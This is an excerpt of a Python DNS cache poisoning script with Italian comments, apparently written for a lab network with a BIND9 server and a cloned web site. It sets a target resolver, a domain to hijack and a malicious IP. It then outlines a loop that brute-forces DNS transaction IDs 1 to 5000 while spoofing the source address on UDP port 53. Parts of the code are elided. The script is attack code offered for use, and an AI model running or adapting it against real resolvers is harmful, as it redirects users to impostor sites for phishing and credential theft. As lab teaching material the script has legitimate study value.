...
dns_server = "172.20.0.53"      # IP del nostro BIND9
target_domain = "www.progetto.ns." # Il dominio da avvelenare
malicious_ip = "172.20.0.80"    # IP del nostro Sito Clone (web_clone)

print(f"[*] Avvio attacco di Poisoning su {dns_server}...")
print(f"[*] Obiettivo: Dirottare {target_domain} verso {malicious_ip}")

# Forgiamo il pacchetto DNS falsificato
# In un blind attack reale, dovremmo indovinare il Transaction ID (ID)
...
def brute_force_poison():
    for tx_id in range(1, 5000): # Proviamo un range di ID
        ...
        # IP: sorgente spoofata (facciamo finta di essere un altro server o lo stesso DNS)
        # UDP: porta 53
